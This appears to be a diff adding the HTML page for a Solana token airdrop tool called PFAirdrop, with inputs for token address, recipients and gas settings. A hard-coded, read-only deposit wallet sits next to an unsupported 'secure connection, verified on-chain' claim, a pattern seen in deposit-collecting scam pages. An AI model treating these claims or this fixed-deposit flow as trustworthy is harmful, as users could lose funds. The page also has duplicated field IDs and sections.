@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PFAirdrop - Secure Token Distribution Platform</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <header>
+        <div class="logo">PFAirdrop</div>
+        <div class="social-buttons">
+            <a href="https://x.com/" target="_blank" class="social-btn twitter">
+                <i class="fab fa-twitter"></i>
+            </a>
+            <a href="https://t.me/" target="_blank" class="social-btn telegram">
+                <i class="fab fa-telegram"></i>
+            </a>
+            <a href="https://pump.fun/board" target="_blank" class="buy-btn">Buy Now</a>
+        </div>
+    </header>
+
+    <main>
+        <div class="airdrop-container">
+            <div class="security-notice">
+                <i class="fas fa-shield-alt"></i>
+                <p>Secure Connection - All transactions are verified on-chain</p>
+            </div>
+
+            <div class="token-section">
+                <h2>Token Configuration</h2>
+                <div class="input-group">
+                    <div class="input-field">
+                        <label for="tokenAddress">Token Contract Address</label>
+                        <input type="text" id="tokenAddress" placeholder="Paste contract address here">
+                    </div>
+                    <div class="input-field">
+                        <label for="depositAddress">Deposit Address</label>
+                        <input type="text" id="depositAddress" value="DsXCHZVsg38wewrAtwQyjAe6s42twkbtw7eUv8rxXBp8" readonly>
+                        <button class="copy-btn" id="copyAddress">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="distribution-section">
+                <h2>Distribution Settings</h2>
+                <div class="distribution-options">
+                    <div class="option-group">
+                        <label class="radio-container">
+                            <input type="radio" name="distributionType" value="equal" checked>
+                            <span class="radio-custom"></span>
+                            Equal Distribution
+                        </label>
+                        <label class="radio-container">
+                            <input type="radio" name="distributionType" value="weighted">
+                            <span class="radio-custom"></span>
+                            Weighted Distribution
+                        </label>
+                        <label class="radio-container">
+                            <input type="radio" name="distributionType" value="random">
+                            <span class="radio-custom"></span>
+                            Random Distribution
+                        </label>
+                    </div>
+                    
+                    <div class="input-field">
+                        <label for="gasStrategy">Gas Strategy</label>
+                        <select id="gasStrategy">
+                            <option value="fast">Fast (Higher Gas)</option>
+                            <option value="normal" selected>Normal</option>
+                            <option value="slow">Slow (Lower Gas)</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <div class="fee-section">
+                <h2>Gas Strategy</h2>
+                <div class="input-group">
+                    <div class="input-field">
+                        <label for="gasStrategy">Transaction Speed</label>
+                        <select id="gasStrategy">
+                            <option value="fast">Fast (0.00001 SOL per tx)</option>
+                            <option value="normal" selected>Normal (0.000005 SOL per tx)</option>
+                            <option value="slow">Slow (0.000001 SOL per tx)</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <div class="balance-section">
+                <h2>Token Balance</h2>
+                <div class="balance-container">
+                    <div class="balance-item">
+                        <span class="balance-label">Available Balance</span>
+                        <span class="balance-value" id="tokenBalance">0</span>
+                        <span class="balance-symbol" id="tokenSymbol">tokens</span>
+                    </div>
+                    <div class="balance-item">
+                        <span class="balance-label">Recipients</span>
+                        <span class="balance-value" id="recipientCount">0</span>
+                    </div>
+                    <div class="balance-item">
+                        <span class="balance-label">Per Recipient</span>
+                        <span class="balance-value" id="perRecipient">0</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="recipients-section">
+                <h2>Recipients</h2>
+                <div class="recipients-input">
+                    <textarea id="recipientsList" placeholder="Enter wallet addresses (one per line)&#10;For weighted distribution use format: address,amount&#10;Example:&#10;NGFKDrt...,200&#10;nto5YFD8...,200"></textarea>
+                    <div class="recipients-controls">
+                        <button class="secondary-btn" id="validateAddresses">
+                            <i class="fas fa-check-circle"></i>
+                            Validate Addresses
+                        </button>
+                        <button class="secondary-btn" id="importCsv">
+                            <i class="fas fa-file-import"></i>
+                            Import CSV
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="confirmation-section">
+                <div class="confirmation-details">
+                    <div class="detail-item">
+                        <span>Total Recipients:</span>
+                        <span id="totalRecipients">0</span>
+                    </div>
+                    <div class="detail-item">
+                        <span>Estimated Gas:</span>
+                        <span id="estimatedGas">0 SOL</span>
+                    </div>
+                    <div class="detail-item">
+                        <span>Network:</span>
+                        <span id="network">Solana</span>
+                    </div>
+                </div>
+                <button id="startAirdrop" class="start-btn">
+                    <i class="fas fa-paper-plane"></i>
+                    Start Airdrop
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <script src="js/main.js"></script>
+</body>
+</html>
